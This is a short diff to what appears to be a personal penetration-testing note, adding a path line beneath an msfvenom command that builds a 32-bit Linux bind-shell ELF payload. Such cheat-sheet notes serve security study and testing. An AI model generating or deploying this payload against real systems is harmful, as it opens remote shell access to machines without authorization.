@@ -3,6 +3,8 @@
 msfvenom -p linux/x86/shell/bind_tcp  LHOST=$LHOST -f elf > bind_shell.elf
 ```
 
+` zet/20221003150763/README.md `
+
 # Related
 
 - [20221003150765](/zet/20221003150765/README.md) MSFVENOM Linux Binary (.elf) 32 Bit (x86)
